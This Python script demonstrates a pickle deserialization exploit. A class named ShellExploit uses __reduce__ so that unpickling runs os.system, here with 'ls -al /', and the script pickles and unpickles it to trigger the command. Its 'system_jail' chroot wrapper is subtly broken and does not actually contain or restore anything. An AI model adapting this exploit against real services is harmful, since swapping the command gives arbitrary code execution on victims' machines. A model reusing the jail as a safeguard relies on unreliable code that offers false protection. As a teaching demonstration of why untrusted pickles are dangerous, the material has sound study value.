import os
import pickle
from contextlib import contextmanager

class ShellExploit(object):
    def __reduce__(self):
        return (os.system, ('ls -al /',))

@contextmanager
def system_jail():
    os.chroot('safe_root/')
    yield
    os.chroot('/')

def serialize():
    with system_jail():
        shellcode = pickle.dumps(ShellExploit())
        return shellcode

def deserialize(exploit_code):
    with system_jail():
        pickle.loads(exploit_code)

if __name__ == '__main__':
    shellcode = serialize()
    deserialize(shellcode)
